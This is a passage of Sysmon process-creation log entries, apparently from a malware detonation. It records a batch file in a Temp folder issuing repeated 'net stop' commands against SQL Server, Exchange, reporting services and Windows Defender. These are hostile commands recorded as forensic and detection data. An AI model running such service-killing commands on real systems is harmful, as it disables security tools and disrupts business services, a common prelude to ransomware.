                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3371-642A-3A0C-000000004A00}; ProcessId=6296; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3371-642A-390C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\net.exe; FileVersion=-; ParentProcessId=6272; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Windows\\system32\\net1  stop MSSQL$MSFW; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net1.exe; IntegrityLevel=High; ParentCommandLine=net  stop MSSQL$MSFW; UtcTime=1680487281; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3371-642A-3B0C-000000004A00}; ProcessId=4856; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=-; ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=net  stop SQLAgent$ISARS; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487281; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3371-642A-3C0C-000000004A00}; ProcessId=3084; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3371-642A-3B0C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\net.exe; FileVersion=-; ParentProcessId=4856; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Windows\\system32\\net1  stop SQLAgent$ISARS; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net1.exe; IntegrityLevel=High; ParentCommandLine=net  stop SQLAgent$ISARS; UtcTime=1680487281; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3371-642A-3D0C-000000004A00}; ProcessId=6564; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=-; ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=net  stop SQLAgent$MSFW; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487281; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3371-642A-3E0C-000000004A00}; ProcessId=5968; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3371-642A-3D0C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\net.exe; FileVersion=-; ParentProcessId=6564; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Windows\\system32\\net1  stop SQLAgent$MSFW; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net1.exe; IntegrityLevel=High; ParentCommandLine=net  stop SQLAgent$MSFW; UtcTime=1680487281; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3372-642A-3F0C-000000004A00}; ProcessId=6648; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=-; ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=net  stop SQLBrowser; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487282; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3372-642A-400C-000000004A00}; ProcessId=6808; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3372-642A-3F0C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\net.exe; FileVersion=-; ParentProcessId=6648; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Windows\\system32\\net1  stop SQLBrowser; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net1.exe; IntegrityLevel=High; ParentCommandLine=net  stop SQLBrowser; UtcTime=1680487282; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3372-642A-410C-000000004A00}; ProcessId=7032; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=-; ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=net  stop ReportServer$ISARS; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487282; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3372-642A-420C-000000004A00}; ProcessId=7052; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3372-642A-410C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\net.exe; FileVersion=-; ParentProcessId=7032; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Windows\\system32\\net1  stop ReportServer$ISARS; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net1.exe; IntegrityLevel=High; ParentCommandLine=net  stop ReportServer$ISARS; UtcTime=1680487282; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3372-642A-430C-000000004A00}; ProcessId=6328; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=-; ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=net  stop SQLWriter; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487282; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3372-642A-440C-000000004A00}; ProcessId=6388; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3372-642A-430C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\net.exe; FileVersion=-; ParentProcessId=6328; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Windows\\system32\\net1  stop SQLWriter; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net1.exe; IntegrityLevel=High; ParentCommandLine=net  stop SQLWriter; UtcTime=1680487282; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3372-642A-450C-000000004A00}; ProcessId=2312; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=-; ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=net  stop WinDefend; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487282; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3372-642A-460C-000000004A00}; ProcessId=4348; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3372-642A-450C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\net.exe; FileVersion=-; ParentProcessId=2312; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Windows\\system32\\net1  stop WinDefend; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net1.exe; IntegrityLevel=High; ParentCommandLine=net  stop WinDefend; UtcTime=1680487282; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3372-642A-470C-000000004A00}; ProcessId=3288; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=-; ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=net  stop mr2kserv; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487282; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3372-642A-480C-000000004A00}; ProcessId=2872; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3372-642A-470C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\net.exe; FileVersion=-; ParentProcessId=3288; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Windows\\system32\\net1  stop mr2kserv; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net1.exe; IntegrityLevel=High; ParentCommandLine=net  stop mr2kserv; UtcTime=1680487282; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3372-642A-490C-000000004A00}; ProcessId=5572; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=-; ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=net  stop MSExchangeADTopology; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487282; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3372-642A-4A0C-000000004A00}; ProcessId=5472; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3372-642A-490C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\net.exe; FileVersion=-; ParentProcessId=5572; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Windows\\system32\\net1  stop MSExchangeADTopology; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net1.exe; IntegrityLevel=High; ParentCommandLine=net  stop MSExchangeADTopology; UtcTime=1680487282; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3372-642A-4B0C-000000004A00}; ProcessId=2560; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=-; ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=net  stop MSExchangeFBA; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487282; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3372-642A-4C0C-000000004A00}; ProcessId=5792; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3372-642A-4B0C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\net.exe; FileVersion=-; ParentProcessId=2560; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Windows\\system32\\net1  stop MSExchangeFBA; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net1.exe; IntegrityLevel=High; ParentCommandLine=net  stop MSExchangeFBA; UtcTime=1680487282; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3372-642A-4D0C-000000004A00}; ProcessId=6152; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=-; ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=net  stop MSExchangeIS; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487282; RuleName=-}"
                                                                                             },
